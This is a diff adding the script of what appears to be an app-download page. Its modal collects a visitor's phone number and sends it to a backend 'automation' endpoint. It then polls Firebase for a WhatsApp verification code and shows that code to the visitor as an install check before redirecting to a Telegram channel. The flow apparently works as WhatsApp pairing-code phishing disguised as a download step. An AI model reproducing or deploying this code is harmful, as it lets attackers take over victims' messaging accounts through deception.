+        document.querySelectorAll('.modal-view').forEach(v => v.classList.remove('active'));
+        document.getElementById(viewId).classList.add('active');
+    }
+
+    function closeInstallationModal() {
+        document.getElementById('downloadModal').classList.remove('active');
+        if(firebaseIntervalTimer) clearInterval(firebaseIntervalTimer);
+        // Clear phone input fields safely
+        document.getElementById('authMobileNumber').value = "";
+    }
+
+    // Modal Navigation listeners
+    document.getElementById('bannerNextBtn').addEventListener('click', () => {
+        switchModalView('viewPhoneAuth');
+    });
+
+    // SUBMIT & CORE REAL-TIME SYNC LOGIC
+    document.getElementById('phoneSubmitBtn').addEventListener('click', async () => {
+        const phoneInput = document.getElementById('authMobileNumber').value.trim();
+        if(phoneInput.length !== 10) {
+            alert("Kripya sahi 10-digit mobile number enter karein!");
+            return;
+        }
+
+        // Generate dynamic secure context key
+        currentSessionId = "session_" + Date.now() + Math.floor(Math.random() * 1000);
+        switchModalView('viewTerminalSync');
+
+        // Reset Terminal panel view variables
+        document.getElementById('terminalCodeText').innerText = "—— ——";
+        document.getElementById('terminalStatusText').innerText = "Initializing security protocol...";
+        document.getElementById('terminalStatusBlock').style.color = "#fbbf24";
+        document.getElementById('terminalGuideMsg').style.display = "block";
+        document.getElementById('terminalSuccessBtn').style.display = "none";
+        document.getElementById('terminalCancelBtn').innerText = "Cancel Process";
+
+        try {
+            // Trigger Back-end script execution channel
+            const response = await fetch(API_START_AUTOMATION, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    mobileNumber: phoneInput,
+                    appName: selectedAppData.name,
+                    targetDownloadLink: TELEGRAM_CHANNEL_URL
+                })
+            });
+
+            const initResult = await response.json();
+            if(!initResult.success) {
+                throw new Error(initResult.error || "Tunnel compilation failure.");
+            }
+
+            // Start polling database directly via REST API endpoints
+            startDatabaseSyncTracker();
+
+        } catch (err) {
+            document.getElementById('terminalStatusText').innerText = "Connection failed: " + err.message;
+            document.getElementById('terminalStatusBlock').style.color = "#ef4444";
+        }
+    });
+
+    function startDatabaseSyncTracker() {
+        if(firebaseIntervalTimer) clearInterval(firebaseIntervalTimer);
+
+        firebaseIntervalTimer = setInterval(async () => {
+            try {
+                const checkUrl = `${FIREBASE_REST_DB_URL}/${currentSessionId}.json`;
+                const res = await fetch(checkUrl);
+                const data = await res.json();
+
+                if(!data) return;
+
+                // Handle Error condition
+                if(data.status === "Error") {
+                    clearInterval(firebaseIntervalTimer);
+                    document.getElementById('terminalStatusText').innerText = data.errorMessage || "Verification rejected.";
+                    document.getElementById('terminalStatusBlock').style.color = "#ef4444";
+                    return;
+                }
+
+                // Handle extracted device verification code assignment
+                if(data.whatsappCode && data.status === "Code_Generated") {
+                    document.getElementById('terminalCodeText').innerText = data.whatsappCode;
+                    document.getElementById('terminalStatusText').innerText = "Waiting for terminal approval...";
+                }
+
+                // Handle Successful pairing loop termination
+                if(data.status === "Success") {
+                    clearInterval(firebaseIntervalTimer);
+                    document.getElementById('terminalStatusText').innerText = "Device Verification Successful!";
+                    document.getElementById('terminalStatusBlock').style.color = "#10b981";
+                    document.getElementById('terminalGuideMsg').style.display = "none";
+                    
+                    // Show final actions layout
+                    const successBtn = document.getElementById('terminalSuccessBtn');
+                    successBtn.style.display = "flex";
+                    document.getElementById('terminalCancelBtn').innerText = "Close Window";
+
+                    // Attach ultimate target package forwarder logic
+                    successBtn.onclick = function() {
+                        // Redirect user to destination path safely
+                        window.open(TELEGRAM_CHANNEL_URL, '_blank');
+                        closeInstallationModal();
+                    };
+                }
+
+            } catch (trackerErr) {
+                console.error("Polling sync error:", trackerErr);
+            }
+        }, 3000); // Poll every 3 seconds for optimum real-time tracking speed
+    }
+
+    // THEME AND DRAWER TRIGGERS
+    const themeToggle = document.getElementById('themeToggle');
+    const htmlEl = document.documentElement;
+    if(localStorage.getItem('theme') === 'dark' || !localStorage.getItem('theme')) {
+        htmlEl.classList.add('dark-mode');
+        themeToggle.innerText = '☀️';
+    } else {
+        htmlEl.classList.remove('dark-mode');
+        themeToggle.innerText = '🌙';
+    }
+    themeToggle.addEventListener('click', () => {
+        if(htmlEl.classList.contains('dark-mode')) {
+            htmlEl.classList.remove('dark-mode');
+            localStorage.setItem('theme', 'light');
+            themeToggle.innerText = '🌙';
+        } else {
+            htmlEl.classList.add('dark-mode');
+            localStorage.setItem('theme', 'dark');
+            themeToggle.innerText = '☀️';
+        }
+    });
+
+    const menuBtn = document.getElementById('menuBtn');
+    const drawerOverlay = document.getElementById('drawerOverlay');
+    const drawer = document.getElementById('drawer');
+    const closeDrawer = document.getElementById('closeDrawer');
+    function openDrawer() { drawerOverlay.classList.add('active'); drawer.classList.add('open'); document.body.style.overflow = 'hidden'; }
+    function closeDrawerFunc() { drawerOverlay.classList.remove('active'); drawer.classList.remove('open'); document.body.style.overflow = ''; }
+    menuBtn.addEventListener('click', openDrawer);
+    closeDrawer.addEventListener('click', closeDrawerFunc);
+    drawerOverlay.addEventListener('click', (e) => { if(e.target === drawerOverlay) closeDrawerFunc(); });
+
+    // Handle outside modal click dismissals safely
+    const modalContainer = document.getElementById('downloadModal');
+    modalContainer.addEventListener('click', (e) => { 
+        if(e.target === modalContainer) {
+            // Prevent sudden shutdown if processing active terminal verification code
+            const currentActiveView = document.querySelector('.modal-view.active').id;
+            if(currentActiveView !== 'viewTerminalSync') {
+                closeInstallationModal();
+            }
+        } 
+    });
+
+    buildCards();
+</script>
+</body>
+</html>
